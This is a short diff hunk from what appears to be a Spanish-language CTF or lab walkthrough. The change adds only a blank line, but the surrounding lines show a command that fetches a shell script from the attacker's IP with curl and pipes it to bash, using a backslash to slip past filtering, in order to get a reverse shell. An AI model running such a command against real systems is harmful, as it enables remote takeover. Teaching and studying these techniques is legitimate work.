@@ -99,6 +99,7 @@ Ahora, en la web vamos a ejecutar el comando:
     </div>
     <pre style="text-align:center;"><code class="language-bash" >curl http://ip_nuestra/nombre_shell | ba\sh</code></pre>
   </div>
+  
 para poder obtener la *reverse shell* y seguido ejecutarla escapando el comando `bash`.
 
 <table style="text-align:center">
